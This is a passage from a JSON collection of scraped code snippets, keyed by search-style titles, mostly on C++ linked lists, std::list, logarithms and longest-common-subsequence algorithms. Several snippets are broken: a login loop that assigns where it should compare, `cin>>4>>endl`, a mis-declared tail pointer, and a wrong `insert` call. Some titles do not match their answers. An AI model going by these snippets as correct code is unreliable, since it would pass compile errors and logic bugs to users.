\tcout<<endl; \t \t//removing an element from both sides \tl2.pop_front(); \tl2.pop_back(); \t \t//adding an element from both sides \tl2.push_back(10); \tl2.push_front(20); \t \t     return 0; }\nstruct Node {   int data;   struct Node *next; };\ntemplate<typename T> class list {   public:      struct node {         T value;         node* next;     };      list() : hd(nullptr), tl(nullptr) {}      node* head() { return hd; }     node* tail() { return tl; }      void insert(node* prior, T value);      node* at(int i);          void erase(node* prior);     void clear();      void push_back(T value);     void pop_back();      void push_front(T value);     void pop_front();      int size();        private:     node* hd, tl; } \n",
    "reg_date": "2021-10-12T11:41:55.000Z"
  },
  {
    "id": 2961,
    "keyword": null,
    "link": null,
    "title": " linked list in c++ using class insert delete display in array",
    "description": "#include <iostream> using namespace std;   // A linked list node struct Node {    int data;    struct Node *next; }; //insert a new node in front of the list void push(struct Node** head, int node_data) {    /* 1. create and allocate node */    struct Node* newNode = new Node;      /* 2. assign data to node */    newNode->data = node_data;      /* 3. set next of new node as head */    newNode->next = (*head);      /* 4. move the head to point to the new node */    (*head) = newNode; }   //insert new node after a given node void insertAfter(struct Node* prev_node, int node_data) {   /*1. check if the given prev_node is NULL */ if (prev_node == NULL) {    cout<<\"the given previous node is required,cannot be NULL\"; return; }       /* 2. create and allocate new node */    struct Node* newNode =new Node;       /* 3. assign data to the node */    newNode->data = node_data;      /* 4. Make next of new node as next of prev_node */    newNode->next = prev_node->next;       /* 5. move the next of prev_node as new_node */     prev_node->next = newNode; }   /* insert new node at the end of the linked list */ void append(struct Node** head, int node_data) { /* 1. create and allocate node */ struct Node* newNode = new Node;   struct Node *last = *head; /* used in step 5*/   /* 2. assign data to the node */ newNode->data = node_data;   /* 3. set next pointer of new node to null as its the last node*/ newNode->next = NULL;   /* 4. if list is empty, new node becomes first node */ if (*head == NULL) { *head = newNode; return; }   /* 5. Else traverse till the last node */ while (last->next != NULL) last = last->next;   /* 6. Change the next of last node */ last->next = newNode; return; }   // display linked list contents void displayList(struct Node *node) {    //traverse the list to display each node    while (node != NULL)    {       cout<<node->data<<\"-->\";       node = node->next;    }   if(node== NULL) cout<<\"null\";  }  /* main program for linked list*/ int main()  {  /* empty list */ struct Node* head = NULL;    // Insert 10. append(&head, 10);    // Insert 20 at the beginning.  push(&head, 20);    // Insert 30 at the beginning.  push(&head, 30);    // Insert 40 at the end.  append(&head, 40); //    Insert 50, after 20.  insertAfter(head->next, 50);   cout<<\"Final linked list: \"<<endl; displayList(head);   return 0; } \n",
    "reg_date": "2021-10-12T11:41:55.000Z"
  },
  {
    "id": 2962,
    "keyword": null,
    "link": null,
    "title": " linked list insertion in c++",
    "description": "/**  * C program to insert a new node at the beginning of a Singly Linked List  */  #include <stdio.h> #include <stdlib.h>   /* Structure of a node */ struct node {     int data;          // Data      struct node *next; // Address  }*head;   void createList(int n); void insertNodeAtBeginning(int data); void displayList();   int main() {     int n, data;      /*      * Create a singly linked list of n nodes      */     printf(\"Enter the total number of nodes: \");     scanf(\"%d\", &n);     createList(n);      printf(\"\\nData in the list \\n\");     displayList();      /*      * Insert data at the beginning of the singly linked list      */     printf(\"\\nEnter data to insert at beginning of the list: \");     scanf(\"%d\", &data);     insertNodeAtBeginning(data);      printf(\"\\nData in the list \\n\");     displayList();      return 0; }   /*  * Create a list of n nodes  */ void createList(int n) {     struct node *newNode, *temp;     int data, i;      head = (struct node *)malloc(sizeof(struct node));      /*      * If unable to allocate memory for head node      */     if(head == NULL)     {         printf(\"Unable to allocate memory.\");     }     else     {         /*          * Input data of node from the user          */         printf(\"Enter the data of node 1: \");         scanf(\"%d\", &data);          head->data = data; // Link data field with data         head->next = NULL; // Link address field to NULL          temp = head;          /*          * Create n nodes and adds to linked list          */         for(i=2; i<=n; i++)         {             newNode = (struct node *)malloc(sizeof(struct node));              /* If memory is not allocated for newNode */             if(newNode == NULL)             {                 printf(\"Unable to allocate memory.\");                 break;             }             else             {                 printf(\"Enter the data of node %d: \", i);                 scanf(\"%d\", &data);                  newNode->data = data; // Link data field of newNode with data                 newNode->next = NULL; // Link address field of newNode with NULL                  temp->next = newNode; // Link previous node i.e. temp to the newNode                                  temp = temp->next;              }         }          printf(\"SINGLY LINKED LIST CREATED SUCCESSFULLY\\n\");     } }   /*  * Create a new node and inserts at the beginning of the linked list.  */ void insertNodeAtBeginning(int data) {     struct node *newNode;      newNode = (struct node*)malloc(sizeof(struct node));      if(newNode == NULL)     {         printf(\"Unable to allocate memory.\");     }     else     {         newNode->data = data; // Link data part         newNode->next = head; // Link address part          head = newNode;          // Make newNode as first node          printf(\"DATA INSERTED SUCCESSFULLY\\n\");     } }   /*  * Display entire list  */ void displayList() {     struct node *temp;      /*      * If the list is empty i.e. head = NULL      */     if(head == NULL)     {         printf(\"List is empty.\");     }     else     {         temp = head;         while(temp != NULL)         {             printf(\"Data = %d\\n\", temp->data); // Print data of current node             temp = temp->next;                 // Move to next node         }     } }\n#include <iostream> // Linked list struct node {     int data ;     node * link; };   node * Node(int data) {     node * temp = new node();     temp->data = data;     temp->link = NULL;     return temp; }  void append(node ** head, int data) {      if(*head == NULL) {         *head =  Node(data);     }else {         node * temp = * head;         while (temp->link != NULL) {             temp=temp->link;         }         temp->link = Node(data);      }  }   // insertion at begining  void insertBeg(node **head , int data) {     if(*head == NULL) {         * head = Node(data);     }else {         node * temp = Node(data);         temp->link = *head;         *head = temp;      }   } // insert at specific position  void addafter(node * head , int loc , int data) {     node * temp , * r ;     temp = head ;     for( int i = 0 ; i<loc;i++ ) {         temp = temp->link;         if(temp == NULL) {             cout<<\"there ar less elemtns\" ;             return;         }      }     // insert new node     r = Node(data);     r->link = temp->link;     temp->link = r;   }  void display(node * head) {      node * temp = head;     while(temp!= NULL) {         cout<<temp->data<<\" \";         temp = temp->link;     } }    int main() {     node * head = NULL;     append(&head,5);     append(&head,5);     append(&head,5);     append(&head,5);     display(head);     cout<<endl;     insertBeg(&head,6);     insertBeg(&head,6);     insertBeg(&head,6);     display(head); addafter(head,4,7); cout<<endl; display(head);      return 0; } \n",
    "reg_date": "2021-10-12T11:41:55.000Z"
  },
  {
    "id": 2963,
    "keyword": null,
    "link": null,
    "title": " linked list operations",
    "description": "/* Given a Singly linked list L0->L1->L2->L3->L4->.......;Write a program to rearrange the nodes in the list so that the newly     formed list is :L0->Ln->L1->Ln-1->L2->Ln-2->.....     Sample input: 1 2 3 4 5 6     Sample output:1 6 2 5 3 4 */  #include<iostream> using namespace std; struct node {     int data;     node* next; }; node *head=new node; node *head1,*head2; void dummy(int s) {     node *temp=new node;     temp->data=s;     temp->next=NULL;     head=temp; } void insert_ll(int k)//Inserting into the list {     node* temp=new node;     temp->data=k;     temp->next=NULL;     if(head==NULL)     {         head=temp;     }     else     {         node* ptr=head;         while(ptr->next!=NULL)         {             ptr=ptr->next;         }         ptr->next=temp;     } } void split()//Splitting the list into two halves {     node* slow=head;     node* fast=head->next;     while(fast&&fast->next)     {         slow=slow->next;         fast=fast->next->next;     }     head1=head;     head2=slow->next;     slow->next=NULL; } void reversing()//Reversing the list {     node* current=head2;     node* prev=NULL;     node*temp;     while(current)     {         temp=current->next;         current->next=prev;         prev=current;         current=temp;     }     head2=prev; } void merge__ll()//Merging the list {     dummy(0);     node*current=head;     while(head1||head2)     {         if(head1)         {             current->next=head1;             current=current->next;             head1=head1->next;         }         if(head2)         {             current->next=head2;             current=current->next;             head2=head2->next;         }     }     head=head->next; } void print()//Printing the list {     node*temp =head;     while(temp!=NULL)     {         cout<<temp->data<<\" \";         temp=temp->next;     }     cout<<endl; } int main() {     head=NULL;     int n;     cout<<\"Enter the size:\"<<endl;//for this question we will consider size though linked list is dynamic and does not have a fixed size     cin>>n;     int x;     cout<<\"enter the elements:\"<<endl;     for(int i=0;i<n;i++)     {         cin>>x;         insert_ll(x);     }     cout<<\"Linked list without the modification is:\";     print();     split();     reversing();     merge__ll();     print();     return 0; } \n// the function is returning the head of the singly linked list Node insertAtEnd(Node head, int val) {     if( head == NULL ) // handing the special case     {         newNode = new Node(val)         head = newNode         return head     }     Node temp = head     // traversing the list to get the last node     while( temp.next != NULL )     {         temp = temp.next     }     newNode = new Node(val)     temp.next = newNode     return head }\n",
    "reg_date": "2021-10-12T11:41:55.000Z"
  },
  {
    "id": 2964,
    "keyword": null,
    "link": null,
    "title": " linkedlist implementation in c++",
    "description": "#include <iostream>  using namespace std;  struct node {     int data;     node *next; };  class linked_list { private:     node *head,*tail; public:     linked_list()     {         head = NULL;         tail = NULL;     }      void add_node(int n)     {         node *tmp = new node;         tmp->data = n;         tmp->next = NULL;          if(head == NULL)         {             head = tmp;             tail = tmp;         }         else         {             tail->next = tmp;             tail = tail->next;         }     } };  int main() {     linked_list a;     a.add_node(1);     a.add_node(2);     return 0; }\n #include <bits/stdc++.h> #include <iostream> #include <list> #include <iterator>  #define ll long long  using namespace std;  //function to print all the elements of the linked list void showList(list <int> l){ \tlist <int> :: iterator it; //create an iterator according to the data structure \tfor(it = l.begin(); it != l.end(); it++){ \t\tcout<<*it<<\" \"; \t} \t }\t   int main(){ \t \tlist <int> l1; \tlist <int> l2; \t \tfor(int i=0; i<10; i++){ \t\tl1.push_back(i*2); //fill list 1 with multiples of 2 \t\tl2.push_back(i*3); //fill list 2 with multiples of 3 \t} \t \tcout<<\"content of list 1 is \"<<endl; \tshowList(l1); \tcout<<endl; \t \tcout<<\"content of list 2 is \"<<endl; \tshowList(l2); \tcout<<endl; \t \t//reverse the first list \tl1.reverse(); \tshowList(l1); \tcout<<endl; \t \t//sort the first list \tl1.sort(); \tshowList(l1); \tcout<<endl; \t \t//removing an element from both sides \tl2.pop_front(); \tl2.pop_back(); \t \t//adding an element from both sides \tl2.push_back(10); \tl2.push_front(20); \t \t     return 0; }\n",
    "reg_date": "2021-10-12T11:41:55.000Z"
  },
  {
    "id": 2965,
    "keyword": null,
    "link": null,
    "title": " linq select where string equals \"String\"",
    "description": "AllApplications.Where(x => x.Name.ToUpperInvariant().Contains(txtSearch.Text.ToUpperInvariant()))).ToList(); \n",
    "reg_date": "2021-10-12T11:41:55.000Z"
  },
  {
    "id": 2966,
    "keyword": null,
    "link": null,
    "title": " list clear c++",
    "description": "// clearing lists #include <iostream> #include <list>  int main () {   std::list<int> mylist;   std::list<int>::iterator it;    mylist.push_back (100);   mylist.push_back (200);   mylist.push_back (300);    std::cout << \"mylist contains:\";   for (it=mylist.begin(); it!=mylist.end(); ++it)     std::cout << ' ' << *it;   std::cout << '\\n';    mylist.clear();   mylist.push_back (1101);   mylist.push_back (2202);    std::cout << \"mylist contains:\";   for (it=mylist.begin(); it!=mylist.end(); ++it)     std::cout << ' ' << *it;   std::cout << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:41:56.000Z"
  },
  {
    "id": 2967,
    "keyword": null,
    "link": null,
    "title": " list conda environments",
    "description": "conda info --envs  conda env list\nconda list -n <my_env>\nconda env list\nconda create --name myenv \nconda remove --name myenv --all \nconda activate myenv\n",
    "reg_date": "2021-10-12T11:41:56.000Z"
  },
  {
    "id": 2968,
    "keyword": null,
    "link": null,
    "title": " list in c++",
    "description": "#include <list> std::list<int> ints;\n//code by Soumyadeep Ghosh //ig: @soumyadepp  #include <bits/stdc++.h>  using namespace std;  void display_list(list<int>li) {   //auto variable to iterate through the list   for(auto i:li)   {     cout<<i<<\" \";   } } int main() {   //definition   list<int>list_1;   int n,x;   cin>>n;   //taking input and inserting using insert function   for(int i=0;i<n;i++)   {     cin>>x;     list_1.insert(x);   }   //if list is not empty display it   if(list_1.empty()==false)   {     display_list(list_1);   }   list_1.sort(); //sorts the list   list_1.reverse(); //reverses the list   list_1.pop_back(); //deletes last element of the list   list_1.pop_front(); //deletes the first element of the list      display_list(list_1);  //function to display the list         return 0; } //in addition , you can use nested lists such as list<list<int>> or list<vector<list>> etc\n// constructing lists #include <iostream> #include <list>  int main () {   // constructors used in the same order as described above:   std::list<int> first;                                // empty list of ints   std::list<int> second (4,100);                       // four ints with value 100   std::list<int> third (second.begin(),second.end());  // iterating through second   std::list<int> fourth (third);                       // a copy of third    // the iterator constructor can also be used to construct from arrays:   int myints[] = {16,2,77,29};   std::list<int> fifth (myints, myints + sizeof(myints) / sizeof(int) );    std::cout << \"The contents of fifth are: \";   for (std::list<int>::iterator it = fifth.begin(); it != fifth.end(); it++)     std::cout << *it << ' ';    std::cout << '\\n';    return 0; }\n #include <bits/stdc++.h> #include <iostream> #include <list> #include <iterator>  #define ll long long  using namespace std;  //function to print all the elements of the linked list void showList(list <int> l){ \tlist <int> :: iterator it; //create an iterator according to the data structure \tfor(it = l.begin(); it != l.end(); it++){ \t\tcout<<*it<<\" \"; \t} \t }\t   int main(){ \t \tlist <int> l1; \tlist <int> l2; \t \tfor(int i=0; i<10; i++){ \t\tl1.push_back(i*2); //fill list 1 with multiples of 2 \t\tl2.push_back(i*3); //fill list 2 with multiples of 3 \t} \t \tcout<<\"content of list 1 is \"<<endl; \tshowList(l1); \tcout<<endl; \t \tcout<<\"content of list 2 is \"<<endl; \tshowList(l2); \tcout<<endl; \t \t//reverse the first list \tl1.reverse(); \tshowList(l1); \tcout<<endl; \t \t//sort the first list \tl1.sort(); \tshowList(l1); \tcout<<endl; \t \t//removing an element from both sides \tl2.pop_front(); \tl2.pop_back(); \t \t//adding an element from both sides \tl2.push_back(10); \tl2.push_front(20); \t \t     return 0; }\n#include <bits/stdc++.h> using namespace std; void display(list<int> &lst){     list<int> :: iterator it;     for(it = lst.begin(); it != lst.end(); it++){          cout<<*it<<\" \";     } } int main(){     list<int> list1;     int data, size;     cout<<\"Enter the list Size \";     cin>>size;     for(int i = 0; i<size; i++){         cout<<\"Enter the element of the list \";         cin>>data;         list1.push_back(data);     }     cout<<endl;     display(list1);   return 0; }  \nlists c++ \n",
    "reg_date": "2021-10-12T11:41:56.000Z"
  },
  {
    "id": 2969,
    "keyword": null,
    "link": null,
    "title": " list in cpp",
    "description": "#include <algorithm> #include <iostream> #include <list>   int main() {     // Create a list containing integers     std::list<int> l = { 7, 5, 16, 8 };       // Add an integer to the front of the list     l.push_front(25);     // Add an integer to the back of the list     l.push_back(13);       // Insert an integer before 16 by searching     auto it = std::find(l.begin(), l.end(), 16);     if (it != l.end()) {         l.insert(it, 42);     }       // Print out the list     std::cout << \"l = { \";     for (int n : l) {         std::cout << n << \", \";     }     std::cout << \"};\\n\"; }\n//code by Soumyadeep Ghosh //ig: @soumyadepp  #include <bits/stdc++.h>  using namespace std;  void display_list(list<int>li) {   //auto variable to iterate through the list   for(auto i:li)   {     cout<<i<<\" \";   } } int main() {   //definition   list<int>list_1;   int n,x;   cin>>n;   //taking input and inserting using insert function   for(int i=0;i<n;i++)   {     cin>>x;     list_1.insert(x);   }   //if list is not empty display it   if(list_1.empty()==false)   {     display_list(list_1);   }   list_1.sort(); //sorts the list   list_1.reverse(); //reverses the list   list_1.pop_back(); //deletes last element of the list   list_1.pop_front(); //deletes the first element of the list      display_list(list_1);  //function to display the list         return 0; } //in addition , you can use nested lists such as list<list<int>> or list<vector<list>> etc\n#include <bits/stdc++.h> using namespace std; void display(list<int> &lst){     list<int> :: iterator it;     for(it = lst.begin(); it != lst.end(); it++){          cout<<*it<<\" \";     } } int main(){     list<int> list1;     int data, size;     cout<<\"Enter the list Size \";     cin>>size;     for(int i = 0; i<size; i++){         cout<<\"Enter the element of the list \";         cin>>data;         list1.push_back(data);     }     cout<<endl;     display(list1);   return 0; }  \ntemplate < class T, class Alloc = allocator<T> > class list;\n",
    "reg_date": "2021-10-12T11:41:56.000Z"
  },
  {
    "id": 2970,
    "keyword": null,
    "link": null,
    "title": " list of products on e commerce websites",
    "description": "ebay \n",
    "reg_date": "2021-10-12T11:41:56.000Z"
  },
  {
    "id": 2971,
    "keyword": null,
    "link": null,
    "title": " list stl",
    "description": "#include <algorithm> #include <iostream> #include <list>   int main() {     // Create a list containing integers     std::list<int> l = { 7, 5, 16, 8 };       // Add an integer to the front of the list     l.push_front(25);     // Add an integer to the back of the list     l.push_back(13);       // Insert an integer before 16 by searching     auto it = std::find(l.begin(), l.end(), 16);     if (it != l.end()) {         l.insert(it, 42);     }       // Print out the list     std::cout << \"l = { \";     for (int n : l) {         std::cout << n << \", \";     }     std::cout << \"};\\n\"; }\ntemplate < class T, class Alloc = allocator<T> > class list;\n#include <iostream> #include<list> #include<algorithm>  using namespace std;  int main() {     list<int>l{10,20,30};     for(list<int>::iterator it1=l.begin();it1!=l.end();it1++)     {         cout<<*it1<<\" \";     }     cout<<endl;     list<int>::iterator it=l.begin();     l.insert(it,50);     for(list<int>::iterator it1=l.begin();it1!=l.end();it1++)     {         cout<<*it1<<\" \";     }     cout<<endl;     l.push_back(60);     l.push_front(100);     for(list<int>::iterator it1=l.begin();it1!=l.end();it1++)     {         cout<<*it1<<\" \";     }     cout<<endl;     l.pop_back();     l.pop_front();     for(list<int>::iterator it1=l.begin();it1!=l.end();it1++)     {         cout<<*it1<<\" \";     }     cout<<endl;     cout<<l.empty()<<endl;     l.reverse();     for(list<int>::iterator it1=l.begin();it1!=l.end();it1++)     {         cout<<*it1<<\" \";     }     cout<<endl;     list<int>l2{100,200,300,400};     l.swap(l2);     for(list<int>::iterator it1=l.begin();it1!=l.end();it1++)     {         cout<<*it1<<\" \";     }     cout<<endl;     for(list<int>::iterator it1=l2.begin();it1!=l2.end();it1++)     {         cout<<*it1<<\" \";     }     cout<<endl;     l2.sort();     for(list<int>::iterator it1=l2.begin();it1!=l2.end();it1++)     {         cout<<*it1<<\" \";     }     cout<<endl;     l2.sort(greater<int>());     for(list<int>::iterator it1=l2.begin();it1!=l2.end();it1++)     {         cout<<*it1<<\" \";     }     cout<<endl;     cout<<\"--------\"<<endl;      l.sort();      l2.sort();      l.merge(l2);      for(list<int>::iterator it1=l.begin();it1!=l.end();it1++)     {         cout<<*it1<<\" \";     }     cout<<endl;     cout<<endl;     return 0; } \n",
    "reg_date": "2021-10-12T11:41:56.000Z"
  },
  {
    "id": 2972,
    "keyword": null,
    "link": null,
    "title": " lists occurrences of characters in the string c++",
    "description": "int d[27]={0}; for (int i = 0; i < str.length(); i++)\t  //AABBCC \td[str[i] - 'A']++; for (int i = 0; i < str.length(); i++)  \tif (d[str[i] - 'A'] != 0) { \t\tcout << str[i] << \" \"<< d[str[i] - 'A'] << \" \"; //A 2 B 2 C 2  }\n",
    "reg_date": "2021-10-12T11:41:56.000Z"
  },
  {
    "id": 2973,
    "keyword": null,
    "link": null,
    "title": " lnk2001 unresolved external symbol   imp PlaySoundA",
    "description": "#pragma comment(lib, \"Winmm.lib\")\n",
    "reg_date": "2021-10-12T11:41:56.000Z"
  },
  {
    "id": 2974,
    "keyword": null,
    "link": null,
    "title": " local static in c++",
    "description": "#include<iostream>  void Increment() { \tint i = 0;//The life time of variable is limited to the function scope \ti++; \tstd::cout << i << std::endl; };//This will increment i to one and when it will reach the end bracket the lifetime of var will get  destroyed void IncrementStaticVar() { \tstatic int i = 0;//The life time of this var is = to program \ti++; \tstd::cout << i << std::endl; }//This will var i increment i till the program ends and i will get destroyed when program ends int main() { \tIncrement();//output 1 \tIncrement();//output 1 \tIncrement();//output 1 \tIncrementStaticVar();// output 2 \tIncrementStaticVar();// output 3 \tIncrementStaticVar();// output 4 \tIncrementStaticVar();// output 5 \tstd::cin.get(); } \n",
    "reg_date": "2021-10-12T11:41:57.000Z"
  },
  {
    "id": 2975,
    "keyword": null,
    "link": null,
    "title": " log base 10 c+ +",
    "description": "double log10(double x) \n",
    "reg_date": "2021-10-12T11:41:57.000Z"
  },
  {
    "id": 2976,
    "keyword": null,
    "link": null,
    "title": " log base c++",
    "description": "int intlog(double base, double x) {     return (int)(log(x) / log(base)); }\n#include <math.h>       /* log */   double param, result;   param = 10;   result = log (param);   printf (\"log(%f) = %f\\n\", param, result );\ndouble log10(double x) \n",
    "reg_date": "2021-10-12T11:41:57.000Z"
  },
  {
    "id": 2977,
    "keyword": null,
    "link": null,
    "title": " log base e synthax c++",
    "description": "#include <math.h>       /* log */   double param, result;   param = 10;   result = log (param);   printf (\"log(%f) = %f\\n\", param, result );\n",
    "reg_date": "2021-10-12T11:41:57.000Z"
  },
  {
    "id": 2978,
    "keyword": null,
    "link": null,
    "title": " log in c++",
    "description": "int intlog(double base, double x) {     return (int)(log(x) / log(base)); }\n#include <math.h>       /* log */   double param, result;   param = 10;   result = log (param);   printf (\"log(%f) = %f\\n\", param, result );\n#include <cmath> log(number)   \n// a simple login for c++ using while loops and io (input output) #include <iostream> #include <string>  using namespace std;  int main() {   cout << \"please enter password\";   string pass = \"0\";                  // making a string for user input   cin >> pass;                        // could be replaced with getline(cin, pass);   while (pass = \"1234\") {             // while loop for when password is wrong     cout << \"incorrect, try again\";     cin >> pass;                      // could be replaced with getline(cin, pass);   }   cout << \"correct password\";         // runs when the while loop is no longer happening }\ndouble log10(double x) \n",
    "reg_date": "2021-10-12T11:41:57.000Z"
  },
  {
    "id": 2979,
    "keyword": null,
    "link": null,
    "title": " logarithmic functions with complex numbers in c/c++",
    "description": "#include \"stdafx.h\" #include \"calc.h\"  void complex_log(double a, double b) { \tif (b == 0 && a > 0) { \t\tresultR = ln(a); \t\tresultI = 0; \t} \telse { \t\tif (a >= mINF && a <= INF && b >= mINF && b <= INF) { \t\t\tresultR = 0; resultI = 0; \t\t\tresultR = ln(pot(pot(a, 2.0, 1) + pot(b, 2.0, 1), 0.5, 1)); \t\t\tresultI = atan2(b, a); \t\t} \t\telse { \t\t\tif (rasf > 0) { \t\t\t\tprintf(\"\\nError in function domain.\\n\\n ==> For complex natural logarithm function the valid domain is [-INF, INF].\\n\\n\"); \t\t\t\tprintf(\" ==> Your function argument: \"); \t\t\t\tcomplexNumber(a, b); \t\t\t} \t\t} \t} }  double ln(double z) { \tdouble result1 = 0; \tresult1 = log10(z) / log10(M_E); \treturn result1; }\n",
    "reg_date": "2021-10-12T11:41:57.000Z"
  },
  {
    "id": 2980,
    "keyword": null,
    "link": null,
    "title": " login.france-io",
    "description": "#include <iostream> #define repeat(nb) for (int _loop = 1, _max = (nb); _loop <= _max; _loop++) using namespace std; int main() {     } \n#include <iostream> #define repeat(nb) for (int _loop = 1, _max = (nb); _loop <= _max; _loop++) using namespace std; int main() {    int res=66;   res=1;   repeat(4){   res=res*2     }   cin>>4>>endl;   cout<<res; } \n",
    "reg_date": "2021-10-12T11:41:58.000Z"
  },
  {
    "id": 2981,
    "keyword": null,
    "link": null,
    "title": " long long int range c++",
    "description": "Long Data Type\t          Size             (in bytes)\tRange long int\t            4\t         -2,147,483,648 to 2,147,483,647 unsigned long int\t    4\t         0 to 4,294,967,295 long long int\t        8\t         -(2^63) to (2^63)-1 unsigned long long int\t8\t         0 to 18,446,744,073,709,551,615\n2^63\nint myNum = 5;               // Integer (whole number) float myFloatNum = 5.99;     // Floating point number double myDoubleNum = 9.98;   // Floating point number char myLetter = 'D';         // Character bool myBoolean = true;       // Boolean string myText = \"Hello\";     // String\n",
    "reg_date": "2021-10-12T11:41:58.000Z"
  },
  {
    "id": 2982,
    "keyword": null,
    "link": null,
    "title": " long pi in c++",
    "description": "#define _USE_MATH_DEFINES // must include this!   #include <cmath> #include <iostream>   int main() {    // M_PI = 3.14159265358979323846;   std::cout << M_PI << \" \" << M_E << \" \" << M_SQRT2 << endl;   return 0; }\ntypedef long double ld; const ld pi = 3.1415926535897932384626433832795;\n",
    "reg_date": "2021-10-12T11:41:58.000Z"
  },
  {
    "id": 2983,
    "keyword": null,
    "link": null,
    "title": " longest common subarray",
    "description": "    for (int i = 0; i <= m; i++)     {         for (int j = 0; j <= n; j++)         {             // The first row and first column             // entries have no logical meaning,             // they are used only for simplicity             // of program             if (i == 0 || j == 0)                 LCSuff[i][j] = 0;               else if (X[i - 1] == Y[j - 1]) {                 LCSuff[i][j] = LCSuff[i - 1][j - 1] + 1;                 result = max(result, LCSuff[i][j]);             }             else                 LCSuff[i][j] = 0;         }     }     return result;\n",
    "reg_date": "2021-10-12T11:41:58.000Z"
  },
  {
    "id": 2984,
    "keyword": null,
    "link": null,
    "title": " longest common subsequence",
    "description": "class Solution:     def longestCommonSubsequence(self, text1: str, text2: str) -> int:         \"\"\"         text1: horizontally         text2: vertically         \"\"\"         dp = [[0 for _ in range(len(text1)+1)] for _ in range(len(text2)+1)]                  for row in range(1, len(text2)+1):             for col in range(1, len(text1)+1):                 if text2[row-1]==text1[col-1]:                     dp[row][col] = 1+ dp[row-1][col-1]                 else:                     dp[row][col] = max(dp[row-1][col], dp[row][col-1])         return dp[len(text2)][len(text1)]\n#include<bits/stdc++.h> using namespace std;  const int MAX = 1001;  int dp[MAX][MAX]; bool visited[MAX][MAX]; int x, y; string s1, s2;  int lcs(int i, int j) {     if(i == x || j == y)         return 0;      if(visited[i][j])         return dp[i][j];      visited[i][j] = true;     int ans = 0;     if(s1[i] == s2[j])     {         ans = max(ans, 1+lcs(i+1, j+1));     }     else     {         ans = max(ans, lcs(i+1, j));         ans = max(ans, lcs(i, j+1));     }      dp[i][j] = ans;     return ans; }  int main() {     cin >> x >> y;     cin >> s1 >> s2;      for(int i=0; i<=x; i++)     {         for(int j=0; j<=y; j++)         {             visited[i][j] = false;         }     }      cout << lcs(0, 0);     return 0; } \nint maxSubsequenceSubstring(char x[], char y[],                              int n, int m)  {      int dp[MAX][MAX];         // Initialize the dp[][] to 0.      for (int i = 0; i <= m; i++)          for (int j = 0; j <= n; j++)              dp[i][j] = 0;         // Calculating value for each element.      for (int i = 1; i <= m; i++) {          for (int j = 1; j <= n; j++) {                 // If alphabet of string X and Y are              // equal make dp[i][j] = 1 + dp[i-1][j-1]              if (x[j - 1] == y[i - 1])                  dp[i][j] = 1 + dp[i - 1][j - 1];                 // Else copy the previous value in the              // row i.e dp[i-1][j-1]              else                 dp[i][j] = dp[i][j - 1];          }      }         // Finding the maximum length.      int ans = 0;      for (int i = 1; i <= m; i++)          ans = max(ans, dp[i][n]);         return ans;  } \n#include<iostream> using namespace std; int LCS(string s1,string s2,int n1,int n2) {     int dp[n1+1][n2+1],i,j;     for(i=0;i<n1+1;i++) dp[i][0]=0;     for(j=0;j<n2+1;j++) dp[0][j]=0;     for(i=1;i<n1+1;i++)     {         for(j=1;j<n2+1;j++)         {             if(s1[i-1]==s2[j-1])                 dp[i][j]=1+dp[i-1][j-1];             else                 dp[i][j]=max(dp[i-1][j],dp[i][j-1]);         }     }     return dp[n1][n2]; } int main() {     string s1,s2;     int n1,n2;     cin>>s1>>s2;     n1 = s1.length();     n2 = s2.length();     cout<<LCS(s1,s2,n1,n2)<<endl; } \n",
    "reg_date": "2021-10-12T11:41:58.000Z"
  },
  {
    "id": 2985,
    "keyword": null,
    "link": null,
    "title": " longest common subsequence algorithm",
    "description": "class Solution:     def longestCommonSubsequence(self, text1: str, text2: str) -> int:         \"\"\"         text1: horizontally         text2: vertically         \"\"\"         dp = [[0 for _ in range(len(text1)+1)] for _ in range(len(text2)+1)]                  for row in range(1, len(text2)+1):             for col in range(1, len(text1)+1):                 if text2[row-1]==text1[col-1]:                     dp[row][col] = 1+ dp[row-1][col-1]                 else:                     dp[row][col] = max(dp[row-1][col], dp[row][col-1])         return dp[len(text2)][len(text1)]\n#include<bits/stdc++.h> using namespace std;  const int MAX = 1001;  int dp[MAX][MAX]; bool visited[MAX][MAX]; int x, y; string s1, s2;  int lcs(int i, int j) {     if(i == x || j == y)         return 0;      if(visited[i][j])         return dp[i][j];      visited[i][j] = true;     int ans = 0;     if(s1[i] == s2[j])     {         ans = max(ans, 1+lcs(i+1, j+1));     }     else     {         ans = max(ans, lcs(i+1, j));         ans = max(ans, lcs(i, j+1));     }      dp[i][j] = ans;     return ans; }  int main() {     cin >> x >> y;     cin >> s1 >> s2;      for(int i=0; i<=x; i++)     {         for(int j=0; j<=y; j++)         {             visited[i][j] = false;         }     }      cout << lcs(0, 0);     return 0; } \nint maxSubsequenceSubstring(char x[], char y[],                              int n, int m)  {      int dp[MAX][MAX];         // Initialize the dp[][] to 0.      for (int i = 0; i <= m; i++)          for (int j = 0; j <= n; j++)              dp[i][j] = 0;         // Calculating value for each element.      for (int i = 1; i <= m; i++) {          for (int j = 1; j <= n; j++) {                 // If alphabet of string X and Y are              // equal make dp[i][j] = 1 + dp[i-1][j-1]              if (x[j - 1] == y[i - 1])                  dp[i][j] = 1 + dp[i - 1][j - 1];                 // Else copy the previous value in the              // row i.e dp[i-1][j-1]              else                 dp[i][j] = dp[i][j - 1];          }      }         // Finding the maximum length.      int ans = 0;      for (int i = 1; i <= m; i++)          ans = max(ans, dp[i][n]);         return ans;  } \n#include<iostream> using namespace std; int LCS(string s1,string s2,int n1,int n2) {     int dp[n1+1][n2+1],i,j;     for(i=0;i<n1+1;i++) dp[i][0]=0;     for(j=0;j<n2+1;j++) dp[0][j]=0;     for(i=1;i<n1+1;i++)     {         for(j=1;j<n2+1;j++)         {             if(s1[i-1]==s2[j-1])                 dp[i][j]=1+dp[i-1][j-1];             else                 dp[i][j]=max(dp[i-1][j],dp[i][j-1]);         }     }     return dp[n1][n2]; } int main() {     string s1,s2;     int n1,n2;     cin>>s1>>s2;     n1 = s1.length();     n2 = s2.length();     cout<<LCS(s1,s2,n1,n2)<<endl; } \n",
    "reg_date": "2021-10-12T11:41:58.000Z"
  },
  {
    "id": 2986,
    "keyword": null,
    "link": null,
    "title": " longest common subsequence codefroces",
